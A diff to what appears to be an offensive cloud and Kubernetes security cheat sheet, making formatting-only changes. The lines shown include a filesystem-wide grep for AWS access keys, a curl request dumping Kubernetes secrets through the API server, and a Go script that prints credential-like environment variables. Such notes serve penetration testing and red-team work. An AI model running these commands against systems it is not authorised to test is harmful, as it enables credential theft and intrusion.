@@ -33,7 +33,7 @@ inurl:pastebin "AWS_ACCESS_KEY"
 Recursively searching for AWS Access Keys on *Nix containers
 
 ```bash
-$ grep -ER "AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16}" /
+grep -ER "AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16}" /
 ```
 
 S3 Log Google Dorking
@@ -493,7 +493,7 @@ for domain in tqdm(domain_names, desc="Checking for subdomain takeovers"):
 ## Kubernetes Secrets Harvesting
 
 ```bash
-$ curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
+curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
 ```
 
 ## Kubernetes Service Enumeration
@@ -609,24 +609,24 @@ A sample script that enumerates environment variables. This script pairs well wi
 package main
 
 import (
-	"fmt"
-	"os"
-	"strings"
+ "fmt"
+ "os"
+ "strings"
 )
 
 func main() {
-	sensitiveKeywords := []string{"password", "secret", "key", "token", "api", "auth", "credential"}
+ sensitiveKeywords := []string{"password", "secret", "key", "token", "api", "auth", "credential"}
 
-	envVars := os.Environ()
-	for _, e := range envVars {
-		envLower := strings.ToLower(e)
-		for _, keyword := range sensitiveKeywords {
-			if strings.Contains(envLower, keyword) {
-				fmt.Printf("SENSITIVE: %s\n", e)
-				break
-			}
-		}
-	}
+ envVars := os.Environ()
+ for _, e := range envVars {
+  envLower := strings.ToLower(e)
+  for _, keyword := range sensitiveKeywords {
+   if strings.Contains(envLower, keyword) {
+    fmt.Printf("SENSITIVE: %s\n", e)
+    break
+   }
+  }
+ }
 }
 ```
 
